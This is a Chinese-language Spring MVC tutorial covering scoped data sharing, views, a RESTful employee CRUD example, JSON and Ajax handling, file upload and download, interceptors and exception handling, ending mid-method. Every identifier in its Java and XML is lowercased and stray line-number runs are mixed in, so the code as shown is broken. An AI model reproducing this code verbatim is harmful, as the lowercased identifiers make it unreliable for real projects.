\n</filter>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> 注： springmvc中处理编码的过滤器一定要配置到其他过滤器之前，否则无效\n\n\n# 域对象共享数据\n\n\n# 使用servletapi向request域对象共享数据\n\n@requestmapping("/testservletapi")  \npublic string testservletapi(httpservletrequest request){  \n request.setattribute("testscope","hello,servletapi");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用modelandview向request域对象共享数据\n\n@requestmapping("/testmodelandview")  \npublic modelandview testmodelandview(){  \n modelandview modelandview = new modelandview();  \n modelandview.setviewname("success");  \n modelandview.addobject("testscope","hello,modelandview");  \n return modelandview;  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 使用model向request域对象共享数据\n\n@requestmapping("/testmodel")  \npublic string testmodelandview(model model){  \n model.addattribute("testscope","hello,model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用map向request域对象共享数据\n\n@requestmapping("/testmap")  \npublic string testmap(map<string,object> map){  \n map.put("testscope","hello,model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用modelmap向request域对象共享数据\n\n@requestmapping("/testmodelmap")  \npublic string testmodelmap(modelmap modelmap){  \n modelmap.put("testscope","hello,modelmap");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# model、modelmap、map的关系\n\nmodel、modelmap、map类型的参数其实本质上都是 bindingawaremodelmap 类型的\n\npublic interface model{}\npublic class modelmap extends linkedhashmap<string, object> {}\npublic class extendedmodelmap extends modelmap implements model {}\npublic class bindingawaremodelmap extends extendedmodelmap {}\n\n\n1\n2\n3\n4\n\n\n\n# session域共享数据\n\n<p th:text="${session.testscope}" ></p>\n\n\n1\n\n\n@requestmapping("/testsession")  \npublic string testsession(httpsession session){  \n session.setattribute("testscope","hello,session");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# application域共享数据\n\n<p th:text="${application.testscope}" ></p>\n\n\n1\n\n\n@requestmapping("/testapplication")  \npublic string testapplication(httpsession session){  \n servletcontext servletcontext = session.getservletcontext();  \n servletcontext.setattribute("testscope","hello,application");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# springmvc的视图\n\nspringmvc中的视图是view接口，视图的作用渲染数据，将模型model中的数据展示给用户 springmvc视图的种类很多，默认有转发视图和重定向视图 当工程引入jstl的依赖，转发视图会自动转换为jstlview 若使用的视图技术为thymeleaf，在springmvc的配置文件中配置了thymeleaf的视图解析器，由此视图解析器解析之后所得到的是thymeleafview。\n\n\n# thymeleafview\n\n当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被springmvc配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图后缀所得到的最终路径，会通过转发的方式实现跳转。\n\n@requestmapping("/test")  \npublic string test(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 转发视图\n\nspringmvc中默认的转发视图是internalresourceview springmvc中创建转发视图的情况： 当控制器方法中所设置的视图名称以"forward:"为前缀时，创建internalresourceview视图，此时的视图名称不会被springmvc配置文件中所配置的视图解析器解析，而是会将前缀"forward:"去掉，剩余部分作为最终路径通过转发的方式实现跳转\n\n例如"forward:/"，"forward:/employee"\n\n@requestmapping("/testforward")\npublic string testforward(){\n    return "forward:/testhello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 重定向视图\n\nspringmvc中默认的重定向视图是redirectview 当控制器方法中所设置的视图名称以"redirect:"为前缀时，创建redirectview视图，此时的视图名称不会被springmvc配置文件中所配置的视图解析器解析，而是会将前缀"redirect:"去掉，剩余部分作为最终路径通过重定向的方式实现跳转\n\n例如"redirect:/"，"redirect:/employee"\n\n@requestmapping("/testredirect")\npublic string testredirect(){\n    return "redirect:/testhello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n> 注： 重定向视图在解析时，会先将redirect:前缀去掉，然后会判断剩余部分是否以/开头，若是则会自动拼接上下文路径。\n\n\n# 视图控制器view-controller\n\n当控制器方法中，仅仅用来实现页面跳转，即只需要设置视图名称时，可以将处理器方法使用view-controller标签进行表示。\n\n\x3c!--\n    path：设置处理的请求地址\n    view-name：设置请求地址所对应的视图名称\n--\x3e\n<mvc:view-controller path="/testview" view-name="success"></mvc:view-controller>\n\n\n1\n2\n3\n4\n5\n\n\n> 注： 当springmvc中设置任何一个view-controller时，其他控制器中的请求映射将全部失效，此时需要在springmvc的核心配置文件中设置开启mvc注解驱动的标签： <mvc:annotation-driven />\n\n\n# restful\n\n\n# restful简介\n\nrest：representational state transfer，表现层资源状态转移。\n\n# 资源\n\n资源是一种看待服务器的方式，即，将服务器看作是由很多离散的资源组成。每个资源是服务器上一个可命名的抽象概念。因为资源是一个抽象的概念，所以它不仅仅能代表服务器文件系统中的一个文件、数据库中的一张表等等具体的东西，可以将资源设计的要多抽象有多抽象，只要想象力允许而且客户端应用开发者能够理解。与面向对象设计类似，资源是以名词为核心来组织的，首先关注的是名词。一个资源可以由一个或多个uri来标识。uri既是资源的名称，也是资源在web上的地址。对某个资源感兴趣的客户端应用，可以通过资源的uri与其进行交互。\n\n# 资源的表述\n\n资源的表述是一段对于资源在某个特定时刻的状态的描述。可以在客户端-服务器端之间转移（交换）。资源的表述可以有多种格式，例如html/xml/json/纯文本/图片/视频/音频等等。资源的表述格式可以通过协商机制来确定。请求-响应方向的表述通常使用不同的格式。\n\n# 状态转移\n\n状态转移说的是：在客户端和服务器端之间转移（transfer）代表资源状态的表述。通过转移和操作资源的表述，来间接实现操作资源的目的。\n\n\n# restful的实现\n\n具体说，就是 http 协议里面，四个表示操作方式的动词：get、post、put、delete。 它们分别对应四种基本操作：get 用来获取资源，post 用来新建资源，put 用来更新资源，delete 用来删除资源。 rest 风格提倡 url 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 url 地址的一部分，以保证整体风格的一致性。\n\n操作     传统方式               rest风格\n查询操作   getuserbyid?id=1   user/1--\x3eget请求方式\n保存操作   saveuser           user--\x3epost请求方式\n删除操作   deleteuser?id=1    user/1--\x3edelete请求方式\n更新操作   updateuser         user--\x3eput请求方式\n\n\n# hiddenhttpmethodfilter\n\n由于浏览器只支持发送get和post方式的请求，那么该如何发送put和delete请求呢？ springmvc 提供了 hiddenhttpmethodfilter 帮助我们将 post 请求转换为 delete 或 put 请求 hiddenhttpmethodfilter 处理put和delete请求的条件：\n\n * 当前请求的请求方式必须为post\n * 当前请求必须传输请求参数_method 满足以上条件，hiddenhttpmethodfilter 过滤器就会将当前请求的请求方式转换为请求参数_method的值，因此请求参数_method的值才是最终的请求方式\n\n在web.xml中注册hiddenhttpmethodfilter\n\n<filter>\n    <filter-name>hiddenhttpmethodfilter</filter-name>\n    <filter-class>org.springframework.web.filter.hiddenhttpmethodfilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>hiddenhttpmethodfilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> 注： 目前为止，springmvc中提供了两个过滤器：characterencodingfilter和hiddenhttpmethodfilter 在web.xml中注册时，必须先注册characterencodingfilter，再注册hiddenhttpmethodfilter 原因：\n> \n>  1. 在 characterencodingfilter 中通过 request.setcharacterencoding(encoding) 方法设置字符集的\n>  2. request.setcharacterencoding(encoding) 方法要求前面不能有任何获取请求参数的操作\n>  3. 而 hiddenhttpmethodfilter 恰恰有一个获取请求方式的操作：string paramvalue = request.getparameter(this.methodparam);\n\n\n# restful案例\n\n# 准备工作\n\n 1. 实体类\n\npublic class employee {\n\nprivate integer id; private string lastname;\n\nprivate string email; //1 male, 0 female private integer gender;\n\npublic integer getid() { return id; }\n\npublic void setid(integer id) { this.id = id; }\n\npublic string getlastname() { return lastname; }\n\npublic void setlastname(string lastname) { this.lastname = lastname; }\n\npublic string getemail() { return email; }\n\npublic void setemail(string email) { this.email = email; }\n\npublic integer getgender() { return gender; }\n\npublic void setgender(integer gender) { this.gender = gender; }\n\npublic employee(integer id, string lastname, string email, integer gender) { super(); this.id = id; this.lastname = lastname; this.email = email; this.gender = gender; }\n\npublic employee() { } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. dao层模拟数据\n\npackage com.atguigu.mvc.dao;\n\nimport java.util.collection;\nimport java.util.hashmap;\nimport java.util.map;\n\nimport com.atguigu.mvc.bean.employee;\nimport org.springframework.stereotype.repository;\n\n\n\n@repository public class employeedao {\n\n\nprivate static map<integer, employee> employees = null;\n\nstatic{\nemployees = new hashmap<integer, employee>();\n\nemployees.put(1001, new employee(1001, "e-aa", "aa@163.com", 1));\nemployees.put(1002, new employee(1002, "e-bb", "bb@163.com", 1));\nemployees.put(1003, new employee(1003, "e-cc", "cc@163.com", 0));\nemployees.put(1004, new employee(1004, "e-dd", "dd@163.com", 0));\nemployees.put(1005, new employee(1005, "e-ee", "ee@163.com", 1));\n}\n\nprivate static integer initid = 1006;\n\npublic void save(employee employee){\nif(employee.getid() == null){\nemployee.setid(initid++);\n}\nemployees.put(employee.getid(), employee);\n}\n\npublic collection<employee> getall(){\nreturn employees.values();\n}\n\npublic employee get(integer id){\nreturn employees.get(id);\n}\n\npublic void delete(integer id){\nemployees.remove(id);\n}\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n# 对应功能列表\n\n功能           url 地址        请求方式\n访问首页√        /             get\n查询全部数据√      /employee     get\n删除√          /employee/2   delete\n跳转到添加数据页面√   /toadd        get\n执行保存√        /employee     post\n跳转到更新数据页面√   /employee/2   get\n执行更新√        /employee     put\n\n# 访问首页功能\n\n 1. 创建页面\n\n<!doctype html>  \n<html lang="en" xmlns:th="http://www.thymeleaf.org">  \n<head>  \n <meta charset="utf-8" >  \n <title>title</title>  \n</head>  \n<body>  \n<h1>首页</h1>  \n<a th:href="@{/employee}">访问员工信息</a>  \n</body>  \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 配置view-controller\n\n<mvc:view-controller path="/" view-name="index"/>\n\n\n1\n\n\n# 查询所有员工信息功能\n\n 1. 创建页面\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>employee info</title>\n    <script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n</head>\n<body>\n\n    <table border="1" cellpadding="0" cellspacing="0" style="text-align: center;" id="datatable">\n        <tr>\n            <th colspan="5">employee info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastname</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options(<a th:href="@{/toadd}">add</a>)</th>\n        </tr>\n        <tr th:each="employee : ${employeelist}">\n            <td th:text="${employee.id}"></td>\n            <td th:text="${employee.lastname}"></td>\n            <td th:text="${employee.email}"></td>\n            <td th:text="${employee.gender}"></td>\n            <td>\n                <a class="deletea" @click="deleteemployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n                <a th:href="@{\'/employee/\'+${employee.id}}">update</a>\n            </td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 2. 创建controller处理请求方法\n\npackage com.pwddd.emp.controller;  \n  \nimport com.pwddd.emp.dao.employeedao;  \nimport com.pwddd.emp.entity.employee;  \nimport org.springframework.beans.factory.annotation.autowired;  \nimport org.springframework.stereotype.controller;  \nimport org.springframework.ui.model;  \nimport org.springframework.web.bind.annotation.requestmapping;  \nimport org.springframework.web.bind.annotation.requestmethod;  \n  \nimport java.util.collection;  \n  \n@controller  \npublic class employeecontroller {  \n  \n @autowired  \n private employeedao employeedao;  \n  \n @requestmapping(value = "/employee", method = requestmethod.get)  \n public string getemployeelist(model model){  \n collection<employee> employeelist = employeedao.getall();  \n model.addattribute("employeelist", employeelist);  \n return "employee_list";  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 删除功能\n\n删除功能稍微麻烦，不能使用form表单进行操作，但是需要设置一个隐藏的_method属性，因此可以使用vue的将a标签触发绑定到一个form表单提交之上，然后在表单里面添加属性。\n\n 1. 创建处理delete请求方式的表单\n\n\x3c!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 --\x3e\n<form id="delete_form" method="post">\n    \x3c!-- hiddenhttpmethodfilter要求：必须传输_method请求参数，并且值为最终的请求方式 --\x3e\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 删除超链接绑定点击事件\n\n\x3c!--引入vue--\x3e\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n\n\x3c!--绑定表单--\x3e\n<a class="deletea" @click="deleteemployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n\n\x3c!--通过vue处理点击事件--\x3e\n<script type="text/javascript">\n    var vue = new vue({\n        el:"#datatable",\n        methods:{\n            //event表示当前事件\n            deleteemployee:function (event) {\n                //通过id获取表单标签\n                var delete_form = document.getelementbyid("delete_form");\n                //将触发事件的超链接的href属性为表单的action属性赋值\n                delete_form.action = event.target.href;\n                //提交表单\n                delete_form.submit();\n                //阻止超链接的默认跳转行为\n                event.preventdefault();\n            }\n        }\n    });\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建服务端的方法\n\n@requestmapping(value = "/employee/{id}", method = requestmethod.delete)\npublic string deleteemployee(@pathvariable("id") integer id){\n    employeedao.delete(id);\n    return "redirect:/employee";\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n 4. spring-mvc.xml配置文件开启静态资源的默认servlet处理\n\n<mvc:default-servlet-handler default-servlet-name="default" />\n\n\n1\n\n\n在默认情况下，存在一个defalutservlet处理我们的请求，但是我们在web.xml中配置的dispatchservlet的url-partten和默认的一样，所以进行了覆盖，也就是客户端的所有请求都会找到dispatchservlet进行处理，包括静态资源，但是dispatchservlet不知道静态资源在哪。开启默认的serlvet处理静态资源，当dispatchservlet找不到请求的内容时，交给默认servlet处理，默认的servlet找不到，则404报错。\n\n# 数据新增\n\n 1. 配置view-controller\n\n<mvc:view-controller path="/toadd" view-name="employee_add"></mvc:view-controller>\n\n\n1\n\n 2. 创建页面\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>add employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    lastname:<input type="text" name="lastname"><br>\n    email:<input type="text" name="email"><br>\n    gender:<input type="radio" name="gender" value="1">male\n    <input type="radio" name="gender" value="0">female<br>\n    <input type="submit" value="add"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 3. 新增服务端方法\n\n@requestmapping(value = "/employee", method = requestmethod.post)\npublic string addemployee(employee employee){\n    employeedao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 数据修改\n\n 1. 创建数据修改页面\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>update employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    <input type="hidden" name="_method" value="put">\n    <input type="hidden" name="id" th:value="${employee.id}">\n    lastname:<input type="text" name="lastname" th:value="${employee.lastname}"><br>\n    email:<input type="text" name="email" th:value="${employee.email}"><br>\n    \x3c!--\n        th:field="${employee.gender}"可用于单选框或复选框的回显\n        若单选框的value和employee.gender的值一致，则添加checked="checked"属性\n    --\x3e\n    gender:<input type="radio" name="gender" value="1" th:field="${employee.gender}">male\n    <input type="radio" name="gender" value="0" th:field="${employee.gender}">female<br>\n    <input type="submit" value="update"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. 服务端配置数据修改页面回显和跳转链接\n\n@requestmapping(value = "/employee/{id}", method = requestmethod.get)\npublic string getemployeebyid(@pathvariable("id") integer id, model model){\n    employee employee = employeedao.get(id);\n    model.addattribute("employee", employee);\n    return "employee_update";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 服务端配置修改操作方法\n\n@requestmapping(value = "/employee", method = requestmethod.put)\npublic string updateemployee(employee employee){\n    employeedao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# httpmessageconverter\n\nhttpmessageconverter，报文信息转换器，将请求报文转换为java对象，或将java对象转换为响应报文。 httpmessageconverter提供了两个注解和两个类型：\n\n * @requestbody\n * @responsebody\n * requestentity\n * responseentity\n\n\n# @requestbody\n\n@requestbody可以获取请求体，需要在控制器方法设置一个形参，使用@requestbody进行标识，当前请求的请求体就会为当前注解所标识的形参赋值\n\n<form th:action="@{/testrequestbody}" method="post">\n    用户名：<input type="text" name="username"><br>\n    密码：<input type="password" name="password"><br>\n    <input type="submit">\n</form>\n\n\n1\n2\n3\n4\n5\n\n\n@requestmapping("/testrequestbody")\npublic string testrequestbody(@requestbody string requestbody){\n    system.out.println("requestbody:"+requestbody);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\nrequestbody:username=admin&amp;password=123456\n\n\n1\n\n\n\n# requestentity\n\nrequestentity封装请求报文的一种类型，需要在控制器方法的形参中设置该类型的形参，当前请求的请求报文就会赋值给该形参，可以通过getheaders()获取请求头信息，通过getbody()获取请求体信息\n\n@requestmapping("/testrequestentity")\npublic string testrequestentity(requestentity<string> requestentity){\n    system.out.println("requestheader:"+requestentity.getheaders());\n    system.out.println("requestbody:"+requestentity.getbody());\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n输出结果： requestheader:[host:"localhost:8080", connection:"keep-alive", content-length:"27", cache-control:"max-age=0", sec-ch-ua:"" not a;brand";v="99", "chromium";v="90", "google chrome";v="90"", sec-ch-ua-mobile:"?0", upgrade-insecure-requests:"1", origin:"[http://localhost:8080"](http://localhost:8080"), user-agent:"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/90.0.4430.93 safari/537.36"] requestbody:username=admin&amp;password=123\n\n\n1\n\n\n\n# @responsebody\n\n@responsebody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器。\n\n@requestmapping("/testresponsebody")\n@responsebody\npublic string testresponsebody(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvc处理json\n\n 1. 导入jackjson依赖\n\n<dependency>\n    <groupid>com.fasterxml.jackson.core</groupid>\n    <artifactid>jackson-databind</artifactid>\n    <version>2.12.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 在springmvc的核心配置文件中开启mvc的注解驱动，此时在handleradaptor中会自动装配一个消息转换器：mappingjackson2httpmessageconverter，可以将响应到浏览器的java对象转换为json格式的字符串\n\n<mvc:annotation-driven />\n\n\n1\n\n\n 3. 在处理器方法上使用@responsebody注解进行标识\n\n 4. 将java对象直接作为控制器方法的返回值返回，就会自动转换为json格式的字符串\n\n@requestmapping("/testresponseuser")\n@responsebody\npublic user testresponseuser(){\n    return new user(1001,"admin","123456",23,"男");\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvc处理ajax\n\n 1. 请求地址超链接\n\n<div id="app">\n    <a th:href="@{/testajax}" @click="testajax">testajax</a><br>\n</div>\n\n\n1\n2\n3\n\n 2. 通过vue和axios处理点击事件\n\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n<script type="text/javascript" th:src="@{/static/js/axios.min.js}"><\/script>\n<script type="text/javascript">\n    var vue = new vue({\n        el:"#app",\n        methods:{\n            testajax:function (event) {\n                axios({\n                    method:"post",\n                    url:event.target.href,\n                    params:{\n                        username:"admin",\n                        password:"123456"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventdefault();\n            }\n        }\n    });\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 3. 编写控制器方法\n\n@requestmapping("/testajax")\n@responsebody\npublic string testajax(string username, string password){\n    system.out.println("username:"+username+",password:"+password);\n    return "hello,ajax";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @restcontroller注解\n\n@restcontroller注解是springmvc提供的一个复合注解，标识在控制器的类上，就相当于为类添加了@controller注解，并且为其中的每个方法添加了@responsebody注解\n\n\n# responseentity\n\nresponseentity用于控制器方法的返回值类型，该控制器方法的返回值就是响应到浏览器的响应报文。\n\n\n# 文件上传和下载\n\n\n# 文件下载功能\n\n@requestmapping("/testdown")\npublic responseentity<byte[]> testresponseentity(httpsession session) throws ioexception {\n    //获取servletcontext对象\n    servletcontext servletcontext = session.getservletcontext();\n    //获取服务器中文件的真实路径\n    string realpath = servletcontext.getrealpath("/static/img/1.jpg");\n    //创建输入流\n    inputstream is = new fileinputstream(realpath);\n    //创建字节数组\n    byte[] bytes = new byte[is.available()];\n    //将流读到字节数组中\n    is.read(bytes);\n    //创建httpheaders对象设置响应头信息\n    multivaluemap<string, string> headers = new httpheaders();\n    //设置要下载方式以及下载文件的名字\n    headers.add("content-disposition", "attachment;filename=1.jpg");\n    //设置响应状态码\n    httpstatus statuscode = httpstatus.ok;\n    //创建responseentity对象\n    responseentity<byte[]> responseentity = new responseentity<>(bytes, headers, statuscode);\n    //关闭输入流\n    is.close();\n    return responseentity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 文件上传功能\n\n文件上传要求form表单的请求方式必须为post，并且添加属性enctype="multipart/form-data" springmvc中将上传的文件封装到multipartfile对象中，通过此对象可以获取文件相关信息\n\n上传步骤：\n\n 1. 添加依赖\n\n\x3c!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\x3e\n<dependency>\n    <groupid>commons-fileupload</groupid>\n    <artifactid>commons-fileupload</artifactid>\n    <version>1.3.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 在springmvc的配置文件中添加配置\n\n\x3c!--必须通过文件解析器的解析才能将文件转换为multipartfile对象--\x3e\n<bean id="multipartresolver" class="org.springframework.web.multipart.commons.commonsmultipartresolver"></bean>\n\n\n1\n2\n\n 3. 配置控制器方法\n\n@requestmapping("/testup")\npublic string testup(multipartfile photo, httpsession session) throws ioexception {\n    //获取上传的文件的文件名\n    string filename = photo.getoriginalfilename();\n    //处理文件重名问题\n    string hzname = filename.substring(filename.lastindexof("."));\n    filename = uuid.randomuuid().tostring() + hzname;\n    //获取服务器中photo目录的路径\n    servletcontext servletcontext = session.getservletcontext();\n    string photopath = servletcontext.getrealpath("photo");\n    file file = new file(photopath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    string finalpath = photopath + file.separator + filename;\n    //实现上传功能\n    photo.transferto(new file(finalpath));\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 拦截器\n\n\n# 拦截器的配置\n\nspringmvc中的拦截器用于拦截控制器方法的执行 springmvc中的拦截器需要实现handlerinterceptor springmvc的拦截器必须在springmvc的配置文件中进行配置：\n\n<bean class="com.atguigu.interceptor.firstinterceptor"></bean>\n<ref bean="firstinterceptor"></ref>\n\x3c!-- 以上两种配置方式都是对dispatcherservlet所处理的所有的请求进行拦截 --\x3e\n<mvc:interceptor>\n    <mvc:mapping path="/**"/>\n    <mvc:exclude-mapping path="/testrequestentity"/>\n    <ref bean="firstinterceptor"></ref>\n</mvc:interceptor>\n\x3c!-- \n    以上配置方式可以通过ref或bean标签设置拦截器，通过mvc:mapping设置需要拦截的请求，通过mvc:exclude-mapping设置需要排除的请求，即不需要拦截的请求\n--\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 拦截器的三个处理方法\n\nspringmvc中的拦截器有三个抽象方法： prehandle：控制器方法执行之前执行prehandle()，其boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；返回false表示拦截，即不调用控制器方法 posthandle：控制器方法执行之后执行posthandle() aftercomplation：处理完视图和模型数据，渲染视图完毕之后执行aftercomplation()\n\n\n# 多个拦截器的执行顺序\n\n * 若每个拦截器的prehandle()都返回true\n   * 此时多个拦截器的执行顺序和拦截器在springmvc的配置文件的配置顺序有关\n   * prehandle()会按照配置的顺序执行，而posthandle()和aftercomplation()会按照配置的反序执行\n * 若某个拦截器的prehandle()返回了false\n   * prehandle()返回false和它之前的拦截器的prehandle()都会执行，posthandle()都不执行，返回false的拦截器之前的拦截器的aftercomplation()会执行\n\n\n# 异常处理器\n\n\n# 基于配置的异常处理\n\nspringmvc提供了一个处理控制器方法执行过程中所出现的异常的接口：handlerexceptionresolver handlerexceptionresolver接口的实现类有：defaulthandlerexceptionresolver和simplemappingexceptionresolver springmvc提供了自定义的异常处理器simplemappingexceptionresolver。\n\n<bean class="org.springframework.web.servlet.handler.simplemappingexceptionresolver">\n    <property name="exceptionmappings">\n        <props>\n            \x3c!--\n                properties的键表示处理器方法执行过程中出现的异常\n                properties的值表示若出现指定异常时，设置一个新的视图名称，跳转到指定页面\n            --\x3e\n            <prop key="java.lang.arithmeticexception">error</prop>\n        </props>\n    </property>\n    \x3c!--\n        exceptionattribute属性设置一个属性名，将出现的异常信息在请求域中进行共享\n    --\x3e\n    <property name="exceptionattribute" value="ex"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 基于注解的异常处理\n\n//@controlleradvice将当前类标识为异常处理的组件\n@controlleradvice\npublic class exceptioncontroller {\n\n    //@exceptionhandler用于设置所标识方法处理的异常\n    @exceptionhandler(arithmeticexception.class)\n    //ex表示当前请求处理中出现的异常对象\n    public string handlearithmeticexception(exception ex, model model){\n        model.addattribute("ex", ex);\n        return "error";\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解配置springmvc\n\n> 使用配置类和注解代替web.xml和springmvc配置文件的功能\n\n 1. 创建初始化类，代替web.xml\n\n在servlet3.0环境中，容器会在类路径中查找实现javax.servlet.servletcontainerinitializer接口的类，如果找到的话就用它来配置servlet容器。 spring提供了这个接口的实现，名为springservletcontainerinitializer，这个类反过来又会查找实现webapplicationinitializer的类并将配置的任务交给它们来完成。spring3.2引入了一个便利的webapplicationinitializer基础实现，名为abstractannotationconfigdispatcherservletinitializer，当我们的类扩展了abstractannotationconfigdispatcherservletinitializer并将其部署到servlet3.0容器的时候，容器会自动发现它，并用它来配置servlet上下文。\n\npublic class webinit extends abstractannotationconfigdispatcherservletinitializer {\n\n    /**\n     * 指定spring的配置类\n     * @return\n     */\n    @override\n    protected class<?>[] getrootconfigclasses() {\n        return new class[]{springconfig.class};\n    }\n\n    /**\n     * 指定springmvc的配置类\n     * @return\n     */\n    @override\n    protected class<?>[] getservletconfigclasses() {\n        return new class[]{webconfig.class};\n    }\n\n    /**\n     * 指定dispatcherservlet的映射规则，即url-pattern\n     * @return\n     */\n    @override\n    protected string[] getservletmappings() {\n        return new string[]{"/"};\n    }\n\n    /**\n     * 添加过滤器\n     * @return\n     */\n    @override\n    protected filter[] getservletfilters() {\n        characterencodingfilter encodingfilter = new characterencodingfilter();\n        encodingfilter.setencoding("utf-8");\n        encodingfilter.setforcerequestencoding(true);\n        hiddenhttpmethodfilter hiddenhttpmethodfilter = new hiddenhttpmethodfilter();\n        return new filter[]{encodingfilter, hiddenhttpmethodfilter};\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n 2. 创建springconfig配置类，代替spring的配置文件\n\n@configuration\npublic class springconfig {\n    //ssm整合之后，spring的配置信息写在此类中\n}\n\n\n1\n2\n3\n4\n\n 3. 创建webconfig配置类，代替springmvc的配置文件\n\n@configuration\n//扫描组件\n@componentscan("com.atguigu.mvc.controller")\n//开启mvc注解驱动\n@enablewebmvc\npublic class webconfig implements webmvcconfigurer {\n\n    //使用默认的servlet处理静态资源\n    @override\n    public void configuredefaultservlethandling(defaultservlethandlerconfigurer configurer) {\n        configurer.enable();\n    }\n\n    //配置文件上传解析器\n    @bean\n    public commonsmultipartresolver multipartresolver(){\n        return new commonsmultipartresolver();\n    }\n\n    //配置拦截器\n    @override\n    public void addinterceptors(interceptorregistry registry) 